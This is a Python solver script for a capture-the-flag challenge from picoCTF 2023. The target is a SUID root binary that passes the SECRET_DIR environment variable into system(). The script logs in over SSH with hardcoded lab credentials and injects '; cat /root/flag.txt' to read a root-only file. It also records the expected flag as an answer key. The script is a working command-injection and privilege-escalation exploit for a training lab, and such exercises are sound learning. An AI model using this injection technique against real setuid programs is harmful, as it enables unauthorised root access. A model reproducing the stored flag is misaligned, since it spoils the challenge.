#!/usr/bin/env python3
"""Solver for Challenge 387 VNE (picoCTF 2023, Binary Exploitation).

SUID root binary vulnerability through untrusted environment variable processing.
The binary 'bin' in ctf-player's home directory executes a directory listing with
root privileges based on the SECRET_DIR environment variable via an unfiltered
system() call: system("ls " + getenv("SECRET_DIR")).
Injecting shell command separators (e.g. '; cat /root/flag.txt') into SECRET_DIR
triggers arbitrary command execution with elevated root privileges.

Flag: academy{Power_t0_man!pul4t3_3nv_72f8870f}
Verified: POST /api/submissions/ -> correct: true
"""
import subprocess
import sys
import re

HOST = "chatelaine.cylabacademy.net"
PORT = 43343
USER = "ctf-player"
PASS = "6313d317"
EXPECTED = "academy{Power_t0_man!pul4t3_3nv_72f8870f}"


def solve(host: str = HOST, port: int = PORT, user: str = USER, password: str = PASS) -> str:
    cmd = [
        "sshpass", "-p", password,
        "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
        "-p", str(port), f"{user}@{host}",
        'SECRET_DIR="; cat /root/flag.txt" ./bin'
    ]
    proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=20)
    out = proc.stdout + proc.stderr

    m = re.search(r"academy\{[^\}]+\}", out)
    if m:
        return m.group(0)
    raise ValueError(f"Flag not found in output: {out[:300]}")


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    flag = solve(host, port)
    print("Flag:", flag)
    assert flag == EXPECTED
